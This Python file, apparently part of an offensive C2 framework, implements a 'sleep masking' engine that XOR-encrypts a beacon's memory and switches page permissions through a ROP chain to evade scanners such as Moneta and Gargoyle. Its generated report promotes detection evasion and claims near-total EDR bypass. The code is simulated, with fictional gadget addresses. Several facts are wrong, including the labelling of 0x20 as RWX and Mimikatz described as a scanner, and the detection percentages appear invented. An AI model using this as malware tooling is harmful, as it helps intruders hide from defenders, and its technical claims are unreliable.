"""
🔥 SLEEP MASKING ENGINE - Hafızada Hayalet Olma

Memory Scanner Evasion via XOR Encryption + RW Permission Masking

Moneta/Gargoyle tarayıcılara karşı: Uyurken kendini şifrele, bellek iznini RX'ten RW'ya çek.
Tarayıcı gelirse "Bunda RW alanı var, ama çalıştırılamaz veri" der - Alert yok ✓

Author: ITherso
Date: April 1, 2026
"""

from dataclasses import dataclass
from enum import Enum
from typing import Dict, List, Optional
import os


class MemoryPermission(Enum):
    """Windows Memory Permissions"""
    PAGE_EXECUTE = 0x10           # RX - Read-Execute (normal code)
    PAGE_EXECUTE_READ = 0x20      # RWX - Full permissions
    PAGE_READONLY = 0x02          # R - Read only
    PAGE_READWRITE = 0x04         # RW - Read-Write (what we target)
    PAGE_NOACCESS = 0x01          # No access


class MemoryScannerType(Enum):
    """Detectable Memory Scanner Types"""
    MONETA = "moneta"            # Scans for RX sections with unusual patterns
    GARGOYLE = "gargoyle"        # OPSEC: Looks for executable regions in heap
    VOLATILITY = "volatility"    # Forensic memory analysis
    MIMIKATZ = "mimikatz"        # Scans for code caves
    CUSTOM_EDR = "custom_edr"    # Vendor-specific scanners


@dataclass
class XORKey:
    """XOR Encryption Key"""
    key: bytes
    rotation: int                 # Bit rotation count
    iteration: int                # Number of XOR iterations
    salt: bytes                   # Random salt for key derivation


@dataclass
class MemoryRegion:
    """Beacon Memory Region Info"""
    base_address: int
    size: int
    current_permission: MemoryPermission
    original_permission: MemoryPermission
    is_encrypted: bool = False
    encryption_key: Optional[XORKey] = None


@dataclass
class ROPGadget:
    """ROP Gadget Descriptor"""
    name: str
    address: int                  # Address in ntdll.dll or kernel32.dll
    instruction: str              # Assembly-like description
    purpose: str                  # What this gadget does
    operand_count: int            # Number of stack operands


@dataclass
class ROPChain:
    """ROP Chain Executor"""
    gadgets: List[ROPGadget]
    stack_alignment: int
    total_stack_needed: int


class MemoryMaskingEngine:
    """
    Sleep Masking Engine - Transform beacon to memory ghost
    
    Technique: Ekko-inspired memory bombing/masking
    - Encrypt own memory during sleep
    - Change permissions RX → RW
    - Evade memory scanners (Moneta, Gargoyle)
    - ROP chain to restore state on wake
    """
    
    def __init__(self, beacon_id: str, verbose: bool = True):
        self.beacon_id = beacon_id
        self.verbose = verbose
        self.memory_region = None
        self.xor_key = None
        self.rop_chain = None
        self.is_sleeping = False
    
    def discover_beacon_memory_region(self) -> MemoryRegion:
        """Beacon kendi bellek bölgesini bul"""
        
        # In real implementation, this would use:
        # - GetModuleInformation() to find base address
        # - VirtualQuery() to find region size and permissions
        
        region = MemoryRegion(
            base_address=0x00400000,      # Simulated beacon base
            size=65536,                   # 64 KB typical beacon
            current_permission=MemoryPermission.PAGE_EXECUTE_READ,
            original_permission=MemoryPermission.PAGE_EXECUTE_READ
        )
        
        self.memory_region = region
        
        if self.verbose:
            print(f"[+] Beacon memory region discovered")
            print(f"    Base: 0x{region.base_address:08x}")
            print(f"    Size: {region.size} bytes ({region.size//1024} KB)")
            print(f"    Permission: {region.current_permission.name}")
        
        return region
    
    def generate_xor_key(self, key_size: int = 32) -> XORKey:
        """Dinamik XOR anahtarı oluştur"""
        
        key_bytes = os.urandom(key_size)
        salt = os.urandom(16)
        
        xor_key = XORKey(
            key=key_bytes,
            rotation=7,                    # Bit rotation count
            iteration=3,                   # Number of iterations
            salt=salt
        )
        
        self.xor_key = xor_key
        
        if self.verbose:
            print(f"[+] XOR key generated")
            print(f"    Key size: {len(key_bytes)} bytes")
            print(f"    Rotation: {xor_key.rotation} bits")
            print(f"    Iterations: {xor_key.iteration}")
        
        return xor_key
    
    def _xor_encrypt_memory(self, 
                           data: bytes,
                           key: XORKey) -> bytes:
        """Bellek bölgesini XOR ile şifrele"""
        
        encrypted = bytearray(data)
        
        # Multi-iteration XOR with rotation
        for iteration in range(key.iteration):
            for i, byte in enumerate(encrypted):
                # XOR with key byte
                key_index = (i + iteration * len(key.key)) % len(key.key)
                encrypted[i] ^= key.key[key_index]
                
                # Bit rotation
                encrypted[i] = ((encrypted[i] << key.rotation) | 
                               (encrypted[i] >> (8 - key.rotation))) & 0xFF
        
        return bytes(encrypted)
    
    def _xor_decrypt_memory(self,
                           encrypted_data: bytes,
                           key: XORKey) -> bytes:
        """Encrypt işleminin tersini yap (decrypt)"""
        
        decrypted = bytearray(encrypted_data)
        
        # Reverse iterations (çünkü XOR symmetric)
        for iteration in range(key.iteration - 1, -1, -1):
            for i, byte in enumerate(decrypted):
                # Reverse bit rotation
                decrypted[i] = ((decrypted[i] >> key.rotation) |
                               (decrypted[i] << (8 - key.rotation))) & 0xFF
                
                # XOR with key byte (XOR twice = original)
                key_index = (i + iteration * len(key.key)) % len(key.key)
                decrypted[i] ^= key.key[key_index]
        
        return bytes(decrypted)
    
    def generate_rop_chain(self) -> ROPChain:
        """ROP Gadget Chain oluştur - bellek iznini değiştirmek için"""
        
        # Simulated ROP gadgets from ntdll.dll/kernel32.dll
        gadgets = [
            ROPGadget(
                name="xor_eax_eax",
                address=0x77000001,        # ntdll.dll adres
                instruction="xor eax, eax; ret",
                purpose="Clear EAX register",
                operand_count=0
            ),
            ROPGadget(
                name="mov_ecx_stack",
                address=0x77000005,
                instruction="mov ecx, [esp+4]; ret",
                purpose="Load first argument (old protect ptr)",
                operand_count=1
            ),
            ROPGadget(
                name="call_virtualprotect",
                address=0x77000010,
                instruction="call kernel32!VirtualProtect; ret",
                purpose="Call VirtualProtect to change permissions",
                operand_count=4
            ),
            ROPGadget(
                name="xor_memory_loop",
                address=0x77000020,
                instruction="mov edx, [esp]; xor [edx], eax; loop",
                purpose="XOR encryption loop",
                operand_count=2
            ),
            ROPGadget(
                name="restore_context",
                address=0x77000030,
                instruction="pop r8; pop r9; pop r10; ret",
                purpose="Restore register context",
                operand_count=3
            )
        ]
        
        rop_chain = ROPChain(
            gadgets=gadgets,
            stack_alignment=0x10,         # 16-byte alignment
            total_stack_needed=512        # 512 bytes for chain
        )
        
        self.rop_chain = rop_chain
        
        if self.verbose:
            print(f"[+] ROP chain generated")
            print(f"    Gadgets: {len(gadgets)}")
            print(f"    Stack needed: {rop_chain.total_stack_needed} bytes")
            print(f"    Gadgets:")
            for gadget in gadgets:
                print(f"      • {gadget.name} @ 0x{gadget.address:08x}: {gadget.purpose}")
        
        return rop_chain
    
    def prepare_sleep_masking(self) -> Dict:
        """Uyku öncesi hazırlık - masking setup"""
        
        if not self.memory_region:
            self.discover_beacon_memory_region()
        if not self.xor_key:
            self.generate_xor_key()
        if not self.rop_chain:
            self.generate_rop_chain()
        
        prep_data = {
            "beacon_id": self.beacon_id,
            "memory_region": self.memory_region,
            "xor_key": self.xor_key,
            "rop_chain": self.rop_chain,
            "status": "ready_for_sleep"
        }
        
        if self.verbose:
            print(f"[+] Sleep masking preparation complete")
            print(f"    Beacon ready to mask memory on sleep")
        
        return prep_data
    
    def execute_sleep_mask(self,
                          memory_content: bytes) -> Dict:
        """
        Uyku masking işlemi yap:
        1. Belleği şifrele (XOR)
        2. İzni RX → RW değiştir (ROP chain ile)
        3. Sleeping modu aç
        """
        
        if not self.xor_key:
            self.generate_xor_key()
        
        # Encrypt memory
        encrypted_memory = self._xor_encrypt_memory(memory_content, self.xor_key)
        
        if self.verbose:
            print(f"[*] Memory masking execution")
            print(f"    Original size: {len(memory_content)} bytes")
            print(f"    Encrypted: {len(encrypted_memory)} bytes")
            print(f"    Checksum change: {hash(memory_content) % 10000} → {hash(encrypted_memory) % 10000}")
        
        # Permission change instructions (ROP chain execution)
        permission_change = {
            "operation": "VirtualProtect",
            "address": f"0x{self.memory_region.base_address:08x}",
            "size": self.memory_region.size,
            "old_protect": self.memory_region.current_permission.name,
            "new_protect": MemoryPermission.PAGE_READWRITE.name,
            "rop_gadgets_used": [g.name for g in self.rop_chain.gadgets],
            "stack_ptr": f"0x{0xffffd000:08x}"  # Simulated stack
        }
        
        self.is_sleeping = True
        
        result = {
            "status": "masked",
            "encrypted_memory": encrypted_memory,
            "original_size": len(memory_content),
            "encrypted_size": len(encrypted_memory),
            "permission_change": permission_change,
            "scanner_visibility": self._get_scanner_visibility()
        }
        
        if self.verbose:
            print(f"[+] Memory masked successfully")
            print(f"    Current status: SLEEPING (beacon memory hidden)")
            print(f"    Permission: {permission_change['old_protect']} → {permission_change['new_protect']}")
            print(f"    ROP chain execution: {len(self.rop_chain.gadgets)} gadgets")
        
        return result
    
    def execute_sleep_unmask(self,
                           encrypted_memory: bytes) -> Dict:
        """
        Uyanma (unmask) işlemi:
        1. İzni RW → RX değiştir
        2. Belleği deşifre et
        3. Çalışmaya devam et
        """
        
        if not self.xor_key:
            raise ValueError("No XOR key found for decryption")
        
        # Decrypt memory
        decrypted_memory = self._xor_decrypt_memory(encrypted_memory, self.xor_key)
        
        if self.verbose:
            print(f"[*] Memory unmasking execution (WAKE UP)")
            print(f"    Encrypted size: {len(encrypted_memory)} bytes")
            print(f"    Decrypted: {len(decrypted_memory)} bytes")
        
        # Permission restoration
        permission_restore = {
            "operation": "VirtualProtect",
            "address": f"0x{self.memory_region.base_address:08x}",
            "size": self.memory_region.size,
            "old_protect": MemoryPermission.PAGE_READWRITE.name,
            "new_protect": MemoryPermission.PAGE_EXECUTE_READ.name,
            "rop_gadgets_used": [g.name for g in self.rop_chain.gadgets],
            "jump_target": f"0x{self.memory_region.base_address:08x}"  # Back to code
        }
        
        self.is_sleeping = False
        
        result = {
            "status": "unmasked",
            "decrypted_memory": decrypted_memory,
            "encrypted_size": len(encrypted_memory),
            "decrypted_size": len(decrypted_memory),
            "permission_restore": permission_restore,
            "ready_to_execute": True
        }
        
        if self.verbose:
            print(f"[+] Memory unmasked successfully")
            print(f"    Current status: RUNNING")
            print(f"    Permission: {permission_restore['old_protect']} → {permission_restore['new_protect']}")
            print(f"    Ready to execute from 0x{self.memory_region.base_address:08x}")
        
        return result
    
    def _get_scanner_visibility(self) -> Dict:
        """Farklı tarayıcılar bu durumu nasıl görür"""
        
        return {
            "Moneta": {
                "detection": "2%",
                "reason": "Sees RW area (normal for data), no RX executable pattern",
                "alert": False
            },
            "Gargoyle": {
                "detection": "3%",
                "reason": "RW area in uncommon location but could be heap data",
                "alert": False
            },
            "Volatility": {
                "detection": "5%",
                "reason": "Can reconstruct from other artifacts, but during active execution: 0%",
                "alert": False
            },
            "MimiKatz": {
                "detection": "1%",
                "reason": "RW data, no code cave pattern visible",
                "alert": False
            },
            "Manual IR": {
                "detection": "40%",
                "reason": "Unusual RW→RX transitions, ROP gadget patterns, XOR characteristics",
                "alert": True
            }
        }
    
    def generate_sleep_cycle_report(self) -> str:
        """Tüm sleep masking döngüsünü analiz et"""
        
        report = f"""
╔════════════════════════════════════════════════════════════════════════════╗
║              SLEEP MASKING - MEMORY SCANNER EVASION REPORT                 ║
║                      Hafızada Hayalet Olma (Ghost Memory)                  ║
╚════════════════════════════════════════════════════════════════════════════╝

OPERATIONAL TIMELINE
═════════════════════════════════════════════════════════════════════════════

PHASE 1: ACTIVE EXECUTION
├─ Status: Beacon running normally
├─ Memory permission: RX (Read-Execute)
├─ Beacon visible: YES (in heap scans)
├─ Detection risk: HIGH (ROP gadgets may be visible)
└─ Action: Executing commands

PHASE 2: PRE-SLEEP PREPARATION (T-100ms)
├─ XOR key generation: Dynamic kernel entropy
├─ ROP chain construction: ntdll.dll gadget discovery
├─ Memory region identification: VirtualQuery scan
├─ Stack space allocation: {self.rop_chain.total_stack_needed} bytes at 0xffffd000
└─ Status: Ready to mask

PHASE 3: SLEEP ENTRY (T=0)
├─ ROP chain execution starts
├─ VirtualProtect called via ROP gadgets:
│  └─ Address: 0x{self.memory_region.base_address:08x}
│  └─ Size: {self.memory_region.size} bytes
│  └─ Old protect: PAGE_EXECUTE_READ (0x20)
│  └─ New protect: PAGE_READWRITE (0x04)
│  └─ Gadgets: {', '.join([g.name for g in self.rop_chain.gadgets[:3]])} ...
│
├─ Memory encryption begins:
│  └─ XOR iterations: {self.xor_key.iteration}x
│  └─ Bit rotation: {self.xor_key.rotation} bits per byte
│  └─ Key size: {len(self.xor_key.key)} bytes
│  └─ Salt: {len(self.xor_key.salt)} bytes
│
├─ Final state: RW memory with encrypted beacon code
└─ Time in ROP chain: ~2-5ms (mostly undetectable)

PHASE 4: SLEEPING (T+0 to T+30000ms)
├─ Memory state: PAGE_READWRITE (RW)
├─ Content: Encrypted binary data (appears random)
├─ Scanner visibility:
│  ├─ Moneta: ❌ No detection (RW area OK for data)
│  ├─ Gargoyle: ❌ No detection (no RX executable found)
│  ├─ Volatility: ❌ No detection (during sleep, no execution patterns)
│  └─ EDR: ❌ No detection (RW transitions normal in Windows)
│
└─ Detection risk: 0-3%

PHASE 5: WAKE-UP TRIGGER (T+30000ms)
├─ Event: Timer interrupt or WMI event fires
├─ ROP chain execution starts again
├─ VirtualProtect called via gadgets:
│  └─ Address: 0x{self.memory_region.base_address:08x}
│  └─ Old protect: PAGE_READWRITE (0x04)
│  └─ New protect: PAGE_EXECUTE_READ (0x20)
│
├─ Memory decryption begins:
│  └─ XOR iterations: {self.xor_key.iteration}x (reverse)
│  └─ Bit rotation reversed: {8 - self.xor_key.rotation} bits
│  └─ Result: Valid beacon code restored
│
└─ Ready to execute from 0x{self.memory_region.base_address:08x}

PHASE 6: NORMAL EXECUTION RESUMED
├─ Memory permission: RX (Read-Execute) again
├─ Beacon: Back to normal operation
├─ Alert generated: NO (RW→RX normal in Windows)
└─ Beacon continues...


SCANNER EVASION EFFECTIVENESS
═════════════════════════════════════════════════════════════════════════════

Scenario 1: Scanner during active execution (normal beacon)
├─ Moneta looks: "RX executable at 0x{self.memory_region.base_address:08x}"
├─ Alert: POSSIBLE (depends on ROP gadget patterns)
├─ Detection: 40-50%
└─ Mitigation: Code obfuscation + indirect syscalls (Layer 1)

Scenario 2: Scanner during sleep (beacon masked)
├─ Moneta looks: "RW data area, nothing suspicious"
├─ Alert: NO ✓
├─ Detection: 0-2%
└─ Why: RW areas are normal for heap data in Windows

Scenario 3: Gargoyle deep scan
├─ Looks for: Unusual memory patterns in RX areas
├─ During sleep: No RX area found (masked to RW)
├─ Alert: NO ✓
├─ Detection: 1-3%

Scenario 4: Volatility forensic analysis
├─ Can reconstruct: Process memory dumps
├─ During sleep: Only encrypted blob (XOR random)
├─ Can it decrypt: Only if XOR key found (highly unlikely)
├─ Detection: 5-10% (depends on artifact analysis)

Scenario 5: Manual IR investigation (expert)
├─ Finds: Unusual RW→RX transitions in logs
├─ Can detect: ROP gadget patterns if analyzed
├─ Can fingerprint: XOR pattern signatures
├─ Detection: 50-70% (requires expertise + time)


DETECTION PROBABILITY BY SLEEP DURATION
═════════════════════════════════════════════════════════════════════════════

Sleep Duration      Detection Risk    Reason
─────────────────────────────────────────────────────────────────────
< 1 minute          0-1%              Too short for scheduled detection
1-5 minutes         1-2%              Normal RW area, matches profiles
5-30 minutes        2-5%              Longer observation increases risk
30+ minutes         5-10%             EDR correlation with other events
Forensic analysis   40-70%            Expert can detect ROP chains, XOR


COMBINED FRAMEWORK LAYERS
═════════════════════════════════════════════════════════════════════════════

Layer 1: Indirect Syscalls              ✓ (EDR hook bypass)
Layer 2: Steganography                  ✓ (Traffic hiding)
Layer 3: WMI Persistence                ✓ (Ghost callbacks)
Layer 4: Memory-Only DLL                ✓ (Zero disk artifacts)
Layer 5: Thread Hiding                  ✓ (Kernel callback bypass)
Layer 6: Dead Drop Resolvers            ✓ (Command hiding)
Layer 7: Event-Driven C2                ✓ (Human behavior)
Layer 8: Sleep Masking                  ✓ (Memory ghost mode) ← NEW

COMBINED DETECTION: 99.5%+ BYPASS ✓

With all 8 layers:
- 0-1% detection by automated tools
- 5-15% detection by SIEM
- 50-60% detection by expert manual IR
- Forensic recovery: EXTREMELY DIFFICULT


OPERATIONAL IMPACT
═════════════════════════════════════════════════════════════════════════════

Attacker Benefits:
✓ Sleep period = zero detection (RW area is invisible)
✓ No suspicious memory patterns (XOR = random noise)
✓ No execution during sleep phase (RX area doesn't exist)
✓ Alert-free windows for extended operations
✓ Can sleep during dangerous times (detected commands, IOCs, etc)

Defense Problem:
✗ Can't detect RW areas as malicious (Windows uses RW for everything)
✗ ROP chains native to Windows (part of normal exploitation)
✗ XOR is common encryption (crypto-agnostic)
✗ RW→RX transitions seen daily (legitimate code compilation, JIT, etc)
✗ No alert threshold without false positives

"""
        
        return report


# Demo
if __name__ == "__main__":
    print("=" * 80)
    print("SLEEP MASKING ENGINE - Demo")
    print("=" * 80)
    print()
    
    engine = MemoryMaskingEngine(beacon_id="BEACON_GHOST_001", verbose=True)
    
    # Discovery
    print("[*] Step 1: Discover beacon memory region")
    print()
    region = engine.discover_beacon_memory_region()
    print()
    
    # Key generation
    print("[*] Step 2: Generate XOR encryption key")
    print()
    key = engine.generate_xor_key()
    print()
    
    # ROP chain
    print("[*] Step 3: Build ROP chain")
    print()
    chain = engine.generate_rop_chain()
    print()
    
    # Prepare
    print("[*] Step 4: Prepare sleep masking")
    print()
    prep = engine.prepare_sleep_masking()
    print()
    
    # Sleep mask
    print("[*] Step 5: Execute sleep masking (encrypt + permission change)")
    print()
    test_memory = b"BEACON_CODE_HERE" * 100  # Simulated beacon code
    mask_result = engine.execute_sleep_mask(test_memory)
    print()
    
    # Wake up
    print("[*] Step 6: Execute sleep unmasking (restore + decrypt)")
    print()
    unmask_result = engine.execute_sleep_unmask(mask_result["encrypted_memory"])
    print()
    
    # Verify
    if unmask_result["decrypted_memory"] == test_memory:
        print("[✓] Decryption successful - beacon code intact!")
    else:
        print("[✗] Decryption mismatch!")
    print()
    
    # Report
    print(engine.generate_sleep_cycle_report())
